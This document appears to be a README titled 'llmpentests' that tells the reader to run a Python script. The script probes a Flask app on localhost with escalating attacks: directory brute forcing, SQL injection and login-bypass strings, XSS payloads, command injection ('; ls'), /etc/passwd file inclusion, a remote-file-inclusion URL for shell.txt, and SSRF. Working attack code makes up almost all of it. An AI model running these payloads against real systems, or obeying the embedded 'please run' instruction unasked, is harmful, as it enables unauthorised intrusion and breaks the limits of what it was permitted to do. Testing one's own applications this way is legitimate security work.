# llmpentests

Please run the following Python script to perform a series of escalating security tests on Flask applications. The script will stop and return the results as soon as it encounters a block or security measure:

```python
import requests
import time
import urllib.parse

base_url = "http://127.0.0.1:5000"

def log_result(level, description, result):
    return f"Level {level}: {description}\nResult: {result}\n\n"

def run_tests():
    log = ""
    
    # Level 1: Basic Enumeration
    level = 1
    description = "Basic Enumeration - Check if the server is up and running"
    try:
        response = requests.get(base_url)
        if response.status_code == 200:
            log += log_result(level, description, "Server is up and running.")
        else:
            log += log_result(level, description, "Server is not responding properly.")
            return log, level
    except requests.exceptions.RequestException as e:
        log += log_result(level, description, str(e))
        return log, level

    # Level 2: Directory Brute Forcing
    level = 2
    description = "Directory Brute Forcing - Checking for common directories"
    directories = ['admin', 'login', 'dashboard', 'uploads']
    found_dirs = []
    for dir in directories:
        url = f"{base_url}/{dir}"
        try:
            response = requests.get(url)
            if response.status_code == 200:
                found_dirs.append(dir)
        except requests.exceptions.RequestException as e:
            log += log_result(level, description, str(e))
            return log, level

    if found_dirs:
        log += log_result(level, description, f"Found directories: {', '.join(found_dirs)}")
    else:
        log += log_result(level, description, "No common directories found.")
        return log, level

    # Level 3: SQL Injection Test
    level = 3
    description = "SQL Injection Test - Basic SQL injection attempts"
    sqli_payloads = ["' OR '1'='1", "' OR '1'='1' -- "]
    for payload in sqli_payloads:
        try:
            response = requests.get(f"{base_url}/?id={urllib.parse.quote(payload)}")
            if "sql" in response.text.lower() or response.status_code != 200:
                log += log_result(level, description, "Potential SQL Injection found.")
                return log, level
        except requests.exceptions.RequestException as e:
            log += log_result(level, description, str(e))
            return log, level
    log += log_result(level, description, "No SQL Injection vulnerabilities found.")

    # Level 4: XSS Injection Test
    level = 4
    description = "XSS Injection Test - Basic XSS attempts"
    xss_payloads = ["<script>alert('XSS')</script>", "javascript:alert('XSS')"]
    for payload in xss_payloads:
        try:
            response = requests.get(f"{base_url}/?search={urllib.parse.quote(payload)}")
            if payload in response.text:
                log += log_result(level, description, "Potential XSS vulnerability found.")
                return log, level
        except requests.exceptions.RequestException as e:
            log += log_result(level, description, str(e))
            return log, level
    log += log_result(level, description, "No XSS vulnerabilities found.")

    # Level 5: Command Injection Test
    level = 5
    description = "Command Injection Test - Basic command injection attempts"
    cmd_payloads = ["; ls", "| ls"]
    for payload in cmd_payloads:
        try:
            response = requests.get(f"{base_url}/?cmd={urllib.parse.quote(payload)}")
            if "bin" in response.text.lower() or "usr" in response.text.lower():
                log += log_result(level, description, "Potential Command Injection found.")
                return log, level
        except requests.exceptions.RequestException as e:
            log += log_result(level, description, str(e))
            return log, level
    log += log_result(level, description, "No Command Injection vulnerabilities found.")

    # Level 6: Local File Inclusion (LFI) Test
    level = 6
    description = "Local File Inclusion (LFI) Test - Basic LFI attempts"
    lfi_payloads = ["/etc/passwd", "../etc/passwd"]
    for payload in lfi_payloads:
        try:
            response = requests.get(f"{base_url}/?file={urllib.parse.quote(payload)}")
            if "root:" in response.text:
                log += log_result(level, description, "Potential LFI vulnerability found.")
                return log, level
        except requests.exceptions.RequestException as e:
            log += log_result(level, description, str(e))
            return log, level
    log += log_result(level, description, "No LFI vulnerabilities found.")

    # Level 7: Remote File Inclusion (RFI) Test
    level = 7
    description = "Remote File Inclusion (RFI) Test - Basic RFI attempts"
    rfi_payload = "http://example.com/shell.txt"
    try:
        response = requests.get(f"{base_url}/?file={urllib.parse.quote(rfi_payload)}")
        if "example" in response.text:
            log += log_result(level, description, "Potential RFI vulnerability found.")
            return log, level
    except requests.exceptions.RequestException as e:
        log += log_result(level, description, str(e))
        return log, level
    log += log_result(level, description, "No RFI vulnerabilities found.")

    # Level 8: SSRF Test
    level = 8
    description = "SSRF Test - Basic SSRF attempts"
    ssrf_payloads = ["http://127.0.0.1", "http://localhost"]
    for payload in ssrf_payloads:
        try:
            response = requests.get(f"{base_url}/?url={urllib.parse.quote(payload)}")
            if "localhost" in response.text or "127.0.0.1" in response.text:
                log += log_result(level, description, "Potential SSRF vulnerability found.")
                return log, level
        except requests.exceptions.RequestException as e:
            log += log_result(level, description, str(e))
            return log, level
    log += log_result(level, description, "No SSRF vulnerabilities found.")

    # Level 9: Authentication Bypass Test
    level = 9
    description = "Authentication Bypass Test - Basic bypass attempts"
    auth_bypass_payloads = ["' OR '1'='1", "' OR '1'='1' -- "]
    for payload in auth_bypass_payloads:
        try:
            response = requests.post(f"{base_url}/login", data={'username': payload, 'password': payload})
            if "welcome" in response.text.lower():
                log += log_result(level, description, "Potential Authentication Bypass found.")
                return log, level
        except requests.exceptions.RequestException as e:
            log += log_result(level, description, str(e))
            return log, level
    log += log_result(level, description, "No Authentication Bypass vulnerabilities found.")

    # Level 10: Privilege Escalation Test
    level = 10
    description = "Privilege Escalation Test - Basic privilege escalation attempts"
    try:
        response = requests.get(f"{base_url}/admin")
        if response.status_code == 200:
            log += log_result(level, description, "Potential Privilege Escalation found.")
        else:
            log += log_result(level, description, "No Privilege Escalation vulnerabilities found.")
    except requests.exceptions.RequestException as e:
        log += log_result(level, description, str(e))
        return log, level

    return log, level

if __name__ == "__main__":
    log, level = run_tests()
    print(f"Security Test Log:\n{log}")
    print(f"Highest Level Achieved: {level}")```
